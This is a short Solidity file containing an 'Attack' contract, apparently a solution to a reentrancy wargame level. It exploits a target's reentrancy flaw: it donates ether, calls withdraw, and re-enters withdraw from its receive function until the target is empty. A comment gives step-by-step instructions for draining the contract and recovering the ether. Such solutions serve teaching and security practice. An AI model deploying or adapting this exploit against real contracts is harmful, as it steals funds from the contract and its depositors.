//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

/**
 * @dev Deploy with address(_reentrance).balance amount of ether,
 * then call withdraw() to drain the contract,
 * then call getEth() to get back all ether
 */
contract Attack {
    IReentrance immutable reentrance;
    uint256 immutable value;

    constructor(IReentrance _reentrance) payable {
        reentrance = _reentrance;
        value = address(_reentrance).balance;
        _reentrance.donate{value: value}(address(this));
    }

    function withdraw() external {
        reentrance.withdraw(value);
    }

    function getEth() external {
        (bool s,) = msg.sender.call{value: address(this).balance}("");
        require(s);
    }

    // reentrancy
    receive() external payable {
        if (address(reentrance).balance > 0) reentrance.withdraw(value);
    }
}